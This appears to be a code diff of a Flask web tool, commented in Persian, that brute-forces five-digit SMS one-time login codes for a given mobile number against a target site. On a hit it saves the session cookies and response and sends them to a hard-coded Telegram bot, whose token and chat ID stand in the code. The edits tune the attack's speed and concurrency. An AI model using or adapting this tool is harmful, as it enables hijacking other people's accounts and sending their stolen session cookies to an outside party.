@@ -8,10 +8,9 @@ from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
 import threading
 
-# تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
-# تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
-TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"  # توکن رباتت رو اینجا بذار
-TELEGRAM_CHAT_ID = "102046811"     # آیدی چتت رو اینجا بذار
+# تنظیمات تلگرام
+TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
+TELEGRAM_CHAT_ID = "-1002021960039"
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -79,7 +78,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
-                    socketio.emit('update_progress', {'log': msg})
+                    socketio.emit('update_progress', {'log': progress_log[-1]})
                     cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                     for cookie in response.cookies:
                         cookie_jar.set_cookie(cookie)
@@ -92,7 +91,6 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     progress_log.append(f"Output saved in {output_file}")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
                     send_file_to_telegram(output_file)
-                    # Send cookies file to Telegram as well
                     send_file_to_telegram(f"cookies_success_{code_str}.txt")
                     return True
                 else:
@@ -117,7 +115,7 @@ def generate_code(counter):
 
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
     global running, found_success
-    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")  # پیام تست
+    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
     socketio.emit('update_progress', {'log': progress_log[-1]})
     batch_size = connections
     found_success = False
@@ -150,7 +148,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                     socketio.emit('update_progress', {'log': progress_log[-1]})
 
         if not found_success:
-            time.sleep(1)
+            time.sleep(0.5)  # کاهش تأخیر از 1 ثانیه به 0.5 ثانیه
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
@@ -189,21 +187,21 @@ def index():
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
-                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="50">
+                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="20">
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">محدوده شروع و پایان:</label>
                     <div class="space-y-2">
-                        <label><input type="radio" name="range" value="0-10000" checked> 0-1</label>|
-                        <label><input type="radio" name="range" value="10000-20000">1-2</label>|
-                        <label><input type="radio" name="range" value="20000-30000">2-3</label>|
-                        <label><input type="radio" name="range" value="30000-40000">3-4</label>|
-                        <label><input type="radio" name="range" value="40000-50000">4-5</label>|
-                        <label><input type="radio" name="range" value="50000-60000">5-6</label>|
-                        <label><input type="radio" name="range" value="60000-70000">6-7</label>|
-                        <label><input type="radio" name="range" value="70000-80000">7-8</label>|
-                        <label><input type="radio" name="range" value="80000-90000">8-9</label>|
-                        <label><input type="radio" name="range" value="90000-99999">9-10</label>|
+                        <label><input type="radio" name="range" value="0-10000" checked> 0-1</label>
+                        <label><input type="radio" name="range" value="10000-20000"> 1-2</label>
+                        <label><input type="radio" name="range" value="20000-30000"> 2-3</label>
+                        <label><input type="radio" name="range" value="30000-40000"> 3-4</label>
+                        <label><input type="radio" name="range" value="40000-50000"> 4-5</label>
+                        <label><input type="radio" name="range" value="50000-60000"> 5-6</label>
+                        <label><input type="radio" name="range" value="60000-70000"> 6-7</label>
+                        <label><input type="radio" name="range" value="70000-80000"> 7-8</label>
+                        <label><input type="radio" name="range" value="80000-90000"> 8-9</label>
+                        <label><input type="radio" name="range" value="90000-99999"> 9-10</label>
                     </div>
                 </div>
                 <div class="flex space-x-4">
@@ -223,17 +221,22 @@ def index():
             const startBtn = document.getElementById('start');
             const stopBtn = document.getElementById('stop');
             const progressDiv = document.getElementById('progress');
+            const maxLogs = 20;  // حداکثر تعداد لاگ‌ها
 
             socket.on('connect', () => {
                 console.log('Connected to WebSocket');
             });
 
             socket.on('update_progress', function(data) {
-                console.log('Received update:', data);  // دیباگ برای چک کردن پیام‌ها
+                console.log('Received update:', data);
                 const log = document.createElement('p');
                 log.textContent = data.log;
                 progressDiv.appendChild(log);
-                progressDiv.scrollTop = progressDiv.scrollTop = progressDiv.scrollHeight;
+                // محدود کردن تعداد لاگ‌ها
+                while (progressDiv.children.length > maxLogs) {
+                    progressDiv.removeChild(progressDiv.firstChild);
+                }
+                progressDiv.scrollTop = progressDiv.scrollHeight;
             });
 
             startBtn.addEventListener('click', () => {
@@ -285,7 +288,7 @@ def start():
 
     running = True
     progress_log = []
-    progress_log.append("Start button clicked!")  # پیام تست
+    progress_log.append("Start button clicked!")
     socketio.emit('update_progress', {'log': progress_log[-1]})
     threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
     return '', 204
@@ -294,7 +297,7 @@ def start():
 def stop():
     global running
     running = False
-    progress_log.append("Stop button clicked!")  # پیام تست
+    progress_log.append("Stop button clicked!")
     socketio.emit('update_progress', {'log': progress_log[-1]})
     return '', 204
 
